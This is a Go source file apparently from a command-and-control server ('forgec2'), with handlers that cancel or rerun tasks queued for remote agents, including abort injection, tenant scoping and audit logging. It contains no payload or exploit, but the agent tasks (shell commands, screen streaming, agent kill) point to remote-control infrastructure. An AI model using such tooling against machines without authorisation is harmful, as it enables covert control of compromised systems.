package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// ── Task cancel / rerun ───────────────────────────────────────────────────

// handleCancelTask cancels a pending or running task.
// POST /agents/:id/tasks/:taskId/cancel
func (s *Server) handleCancelTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		respondError(c, http.StatusBadRequest, "invalid task id")
		return
	}

	var task db.Task
	// Tenant scope: bind the task to the caller's tenant before the
	// agent-ownership check (cancel must not touch other tenants' tasks).
	if err := s.tenantScope(s.db, c).First(&task, taskID).Error; err != nil {
		respondError(c, http.StatusNotFound, "task not found")
		return
	}
	if task.AgentID != agentID {
		respondError(c, http.StatusForbidden, "task belongs to different agent")
		return
	}

	if task.Status != "pending" && task.Status != TaskStatusPendingApproval && task.Status != "running" {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("task is %s, cannot cancel", task.Status))
		return
	}

	// Snapshot the pre-cancel status for the conflict message, then flip to
	// cancelled. wasRunning is decided RACE-FREE by trying the
	// running→cancelled flip FIRST: each conditional update is atomic, so a
	// concurrent claim between the two attempts cannot hide a task the agent
	// already started executing (the old single pre-read snapshot could,
	// skipping abort injection).
	priorStatus := task.Status

	wasRunning := false
	result := s.db.Model(&db.Task{}).
		Where("id = ? AND status = ?", taskID, "running").
		Updates(map[string]interface{}{
			"status": "cancelled",
			"error":  "cancelled by operator",
		})
	if result.Error == nil && result.RowsAffected == 1 {
		wasRunning = true
	} else if result.Error == nil {
		result = s.db.Model(&db.Task{}).
			Where("id = ? AND status IN ?", taskID, []string{"pending", TaskStatusPendingApproval}).
			Updates(map[string]interface{}{
				"status": "cancelled",
				"error":  "cancelled by operator",
			})
	}
	if result.Error != nil {
		slog.Error("Failed to update task status to cancelled", "agent_id", agentID, "task", taskID, "err", result.Error)
		respondError(c, http.StatusInternalServerError, "failed to cancel task")
		return
	}
	if result.RowsAffected == 0 {
		currentStatus := priorStatus
		var fresh db.Task
		if err := s.db.First(&fresh, "id = ?", taskID).Error; err == nil {
			currentStatus = fresh.Status
		}
		respondError(c, http.StatusConflict, fmt.Sprintf("task is now %s, cannot cancel", currentStatus))
		return
	}

	task.Status = "cancelled"
	task.Error = "cancelled by operator"

	// Every non-terminal task occupies a pending-counter slot (reconcile
	// counts pending + running + pending_approval), so cancelling releases it.
	s.decPendingTasks(agentID)

	if wasRunning {
		abortTask := db.Task{
			AgentID:   agentID,
			Type:      "abort",
			Command:   fmt.Sprintf("%d", taskID),
			Status:    "pending",
			Priority:  3,
			ClaimedBy: agentID,
			ClaimedAt: time.Now(),
			CreatedBy: c.GetString("user"),
		}
		if err := s.db.Create(&abortTask).Error; err != nil {
			slog.Error("Failed to inject abort task", "agent_id", agentID, "original_task", taskID, "err", err)
		} else {
			s.agentPendingTasksMu.Lock()
			s.agentPendingTasks[agentID]++
			s.agentPendingTasksMu.Unlock()
			s.broadcastTaskUpdate(agentID, abortTask)
			slog.Info("Abort task injected for cancelled running task", "agent_id", agentID, "original_task", taskID)
		}
	}

	slog.Info("Task cancelled", "agent_id", agentID, "task", taskID, "type", task.Type)
	s.LogAuditRecord(c, "cancel_task", "agent_id", agentID, fmt.Sprintf("Cancelled task #%d (%s)", taskID, task.Type), true, nil)
	s.broadcastTaskUpdate(agentID, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Task cancelled"})
}

// handleRerunTask clones an existing task's parameters and creates a new pending task.
// POST /agents/:id/task/:taskId/rerun
func (s *Server) handleRerunTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	role, _ := c.Get("user_role")
	if role == "viewer" {
		respondError(c, http.StatusForbidden, "viewers cannot rerun tasks")
		return
	}
	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		respondError(c, http.StatusBadRequest, "invalid task id")
		return
	}

	var original db.Task
	// Tenant scope (see handleCancelTask): rerun must not source commands
	// from another tenant's task history.
	if err := s.tenantScope(s.db, c).First(&original, taskID).Error; err != nil {
		respondError(c, http.StatusNotFound, "original task not found")
		return
	}

	// Only rerun tasks that belong to this agent
	if original.AgentID != agentID {
		respondError(c, http.StatusForbidden, "task belongs to different agent")
		return
	}

	// Don't allow rerun of control/monitoring tasks
	noRerun := map[string]bool{
		"kill_agent": true, "screen_stream_start": true, "screen_stream_stop": true,
	}
	if noRerun[original.Type] {
		respondError(c, http.StatusBadRequest, "cannot rerun this task type")
		return
	}

	// Clone the original task parameters
	newTask, err := s.createTask(agentID, original.Type, original.Command, original.Shell, original.Path, original.Data, original.Offset, original.Size)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("Task rerun", "agent_id", agentID, "original_task", taskID, "new_task", newTask.ID, "type", original.Type)
	s.dispatchTask(c, newTask, "rerun_"+original.Type, fmt.Sprintf("rerun of #%d", taskID))
}
